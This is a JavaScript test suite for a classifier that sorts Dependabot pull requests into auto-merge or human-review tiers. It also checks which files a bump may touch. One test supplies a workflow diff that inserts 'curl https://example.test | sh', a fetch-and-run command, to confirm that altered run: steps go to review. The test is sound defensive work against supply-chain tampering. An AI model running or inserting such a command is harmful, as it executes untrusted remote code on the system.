import assert from "node:assert/strict";
import { test } from "node:test";

import { classify, contentReason, isMajor, isSecurityUpdate, parseConfig, usesOnly } from "./dependency-classify.mjs";

const pr = (overrides = {}) => ({
  author: "dependabot[bot]",
  headRef: "dependabot/npm_and_yarn/biomejs/biome-2.3.1",
  title: "build(deps): bump @biomejs/biome from 2.3.0 to 2.3.1",
  body: "Bumps [@biomejs/biome](https://github.com/biomejs/biome) from 2.3.0 to 2.3.1.",
  labels: ["dependencies"],
  ciStatus: "success",
  ...overrides,
});

test("a patch bump of a non-actions package is auto", () => {
  const result = classify(pr());
  assert.equal(result.tier, "auto");
  assert.deepEqual(result.reasons, []);
  assert.deepEqual(result.updates, [{ name: "@biomejs/biome", from: "2.3.0", to: "2.3.1" }]);
  assert.equal(result.ecosystem, "npm_and_yarn");
});

test("a pull request another author opened is not classified", () => {
  assert.equal(classify(pr({ author: "octocat" })), null);
});

test("a major bump is review", () => {
  const result = classify(pr({ title: "Bump @biomejs/biome from 2.3.0 to 3.0.0 in /plugins/miro/server" }));
  assert.equal(result.tier, "review");
  assert.deepEqual(result.reasons, ["major:@biomejs/biome"]);
  assert.deepEqual(result.updates, [{ name: "@biomejs/biome", from: "2.3.0", to: "3.0.0" }]);
});

test("a v-prefixed minor bump of an allowlisted action is auto", () => {
  const result = classify(
    pr({
      headRef: "dependabot/github_actions/actions/checkout-4.2.0",
      title: "build(deps): bump actions/checkout from v4.1.0 to v4.2.0",
    }),
  );
  assert.equal(result.tier, "auto");
});

test("an action from a publisher outside the allowlist is review", () => {
  const result = classify(
    pr({
      headRef: "dependabot/github_actions/zizmorcore/zizmor-action-0.2.1",
      title: "build(deps): bump zizmorcore/zizmor-action from 0.2.0 to 0.2.1",
    }),
  );
  assert.equal(result.tier, "review");
  assert.deepEqual(result.reasons, ["publisher:zizmorcore/zizmor-action"]);
});

test("a group holding one major is review, and every update is listed", () => {
  const body = [
    "Bumps the github-actions group with 2 updates: [a](x) and [b](y).",
    "",
    "Updates `actions/checkout` from 4.1.0 to 5.0.0",
    "<details>",
    "> Updates `actions/fake` from 1.0.0 to 1.0.1",
    "</details>",
    "",
    "Updates `actions/setup-node` from 6.0.0 to 6.1.0",
  ].join("\n");
  const result = classify(
    pr({
      headRef: "dependabot/github_actions/github-actions-abc123",
      title: "build(deps): bump the github-actions group with 2 updates",
      body,
    }),
  );
  assert.equal(result.tier, "review");
  assert.deepEqual(result.reasons, ["major:actions/checkout"]);
  assert.deepEqual(
    result.updates.map((update) => update.name),
    ["actions/checkout", "actions/setup-node"],
  );
});

test("a group whose listed updates do not match its count is review", () => {
  const result = classify(
    pr({
      title: "Bump the npm-minor-patch group across 1 directory with 3 updates",
      body: "Updates `a` from 1.0.0 to 1.0.1\nUpdates `b` from 2.0.0 to 2.1.0",
    }),
  );
  assert.equal(result.tier, "review");
  assert.deepEqual(result.reasons, ["unparsed-group"]);
});

test("a title with no from and to is review", () => {
  const result = classify(pr({ title: "Update everything" }));
  assert.equal(result.tier, "review");
  assert.deepEqual(result.reasons, ["unparsed-title"]);
});

test("a SHA-to-SHA bump is review", () => {
  const from = "a".repeat(40);
  const to = "b".repeat(40);
  const result = classify(pr({ title: `Bump actions/checkout from ${from} to ${to}` }));
  assert.equal(result.tier, "review");
  assert.deepEqual(result.reasons, ["unparsed-version:actions/checkout"]);
});

test("a red ci-status makes any bump review; pending does not", () => {
  assert.deepEqual(classify(pr({ ciStatus: "failure" })).reasons, ["ci-status-red"]);
  assert.deepEqual(classify(pr({ ciStatus: "timed_out" })).reasons, ["ci-status-red"]);
  assert.equal(classify(pr({ ciStatus: "pending" })).tier, "auto");
  assert.equal(classify(pr({ ciStatus: "" })).tier, "auto");
});

test("a 0.x minor bump is review; a 1.x minor bump is auto", () => {
  assert.deepEqual(classify(pr({ title: "bump x from 0.2.0 to 0.3.0" })).reasons, ["major:x"]);
  assert.equal(classify(pr({ title: "bump x from 0.2.0 to 0.2.5" })).tier, "auto");
  assert.equal(classify(pr({ title: "bump x from 1.2.0 to 1.3.0" })).tier, "auto");
});

const metadata = (rows) =>
  [
    "build(deps): bump x",
    "",
    "---",
    "updated-dependencies:",
    ...rows.flatMap(([name, version, type]) => [
      `- dependency-name: ${name}`,
      `  dependency-version: ${version}`,
      "  dependency-type: direct:production",
      `  update-type: version-update:semver-${type}`,
    ]),
    "...",
    "",
    "Signed-off-by: dependabot[bot] <support@github.com>",
  ].join("\n");

test("the verified commit's metadata agreeing with the title keeps the title's tier", () => {
  const result = classify(pr({ commitMessage: metadata([["@biomejs/biome", "2.3.1", "patch"]]) }));
  assert.equal(result.tier, "auto");
  assert.deepEqual(result.reasons, []);
});

test("metadata naming a major makes the bump review", () => {
  const result = classify(pr({ commitMessage: metadata([["@biomejs/biome", "2.3.1", "major"]]) }));
  assert.deepEqual(result.reasons, ["major:@biomejs/biome"]);
});

test("metadata that disagrees with the title is review", () => {
  assert.deepEqual(classify(pr({ commitMessage: metadata([["other", "2.3.1", "patch"]]) })).reasons, ["metadata-disagrees"]);
  assert.deepEqual(classify(pr({ commitMessage: metadata([["@biomejs/biome", "2.4.0", "minor"]]) })).reasons, [
    "metadata-disagrees",
  ]);
});

test("metadata alone classifies when the title is unreadable", () => {
  const result = classify(pr({ title: "Update everything", commitMessage: metadata([["x", "1.2.3", "minor"]]) }));
  assert.equal(result.tier, "auto");
  assert.deepEqual(result.updates, [{ name: "x", from: null, to: "1.2.3", type: "minor" }]);
});

test("major means the first numeric component changed, or the second for 0.x", () => {
  assert.equal(isMajor("1.9.9", "2.0.0"), true);
  assert.equal(isMajor("0.2.0", "0.3.0"), true);
  assert.equal(isMajor("0.2.0", "0.2.9"), false);
  assert.equal(isMajor("1.2.0", "1.3.0"), false);
  assert.equal(isMajor("v6", "v7"), true);
  assert.equal(isMajor("4.1", "4.2.0-rc.1"), false);
  assert.equal(isMajor("main", "4.2.0"), null);
});

test("a security update is the security label or an advisory in the body", () => {
  assert.equal(isSecurityUpdate({ labels: ["Security"], body: "" }), true);
  assert.equal(isSecurityUpdate({ labels: [], body: "Fixes GHSA-abcd-1234-wxyz." }), true);
  assert.equal(isSecurityUpdate({ labels: [], body: "Patches CVE-2026-12345" }), true);
  assert.equal(isSecurityUpdate({ labels: [], body: "See the security advisory." }), true);
  assert.equal(isSecurityUpdate({ labels: ["dependencies"], body: "Bumps x." }), false);
});

test("the classification carries the security flag", () => {
  assert.equal(classify(pr({ labels: ["security"] })).security, true);
  assert.equal(classify(pr()).security, false);
});

// The content rule, as the pr-merge lane applies it (babysit_dependabot.py,
// content_refusal), against a config shaped like this repository's.
const CONFIG = parseConfig(
  [
    "version: 2",
    "updates:",
    "  - package-ecosystem: github-actions",
    "    directory: /",
    "  - package-ecosystem: npm",
    "    directory: /",
    "  - package-ecosystem: npm",
    "    directories:",
    '      - "/plugins/miro/server"',
    "      - /plugins/*/scripts",
    "  - package-ecosystem: pip",
    "    directory: /plugins/animation",
  ].join("\n"),
);
const usesPin = "@@ -10 +10 @@\n-      - uses: actions/checkout@aaaa # v4\n+      - uses: actions/checkout@bbbb # v5";
const withFiles = (files) => classify(pr({ files, config: CONFIG }));

test("the config reads one ecosystem and directory per entry and listed directory", () => {
  assert.deepEqual(CONFIG, [
    ["github-actions", "/"],
    ["npm", "/"],
    ["npm", "/plugins/miro/server"],
    ["npm", "/plugins/*/scripts"],
    ["pip", "/plugins/animation"],
  ]);
  assert.equal(parseConfig("version: 2\n"), null);
});

test("manifests and lockfiles in listed directories, and a uses:-only pin, stay auto", () => {
  const result = withFiles([
    { filename: "package.json", patch: "x" },
    { filename: "package-lock.json" },
    { filename: "plugins/miro/server/package-lock.json" },
    { filename: "plugins/x/scripts/package.json" },
    { filename: "plugins/animation/requirements.txt" },
    { filename: ".github/workflows/ci.yml", patch: usesPin },
  ]);
  assert.equal(result.tier, "auto");
  assert.deepEqual(result.reasons, []);
});

test("a file that is not a dependency manifest is review", () => {
  assert.deepEqual(withFiles([{ filename: "package.json" }, { filename: "dist/index.js" }]).reasons, [
    "dependabot-content:dist/index.js",
  ]);
});

test("a workflow diff that changes a run: line is review", () => {
  const patch = `${usesPin}\n-        run: npm test\n+        run: curl https://example.test | sh`;
  assert.deepEqual(withFiles([{ filename: ".github/workflows/ci.yml", patch }]).reasons, [
    "dependabot-content:.github/workflows/ci.yml",
  ]);
  assert.equal(usesOnly(usesPin), true);
  assert.equal(usesOnly(""), false, "a file with no patch (too large to show) is not a pin");
});

test("a manifest outside every listed directory is review", () => {
  assert.deepEqual(withFiles([{ filename: "plugins/other/package.json" }]).reasons, [
    "dependabot-content:plugins/other/package.json",
  ]);
});

test("both sides of a rename are checked, and no config covers nothing", () => {
  assert.equal(
    contentReason([{ filename: "package.json", previous_filename: "src/old.js" }], CONFIG),
    "dependabot-content:src/old.js",
  );
  assert.equal(contentReason([{ filename: "package.json" }], null), "dependabot-content:package.json");
});
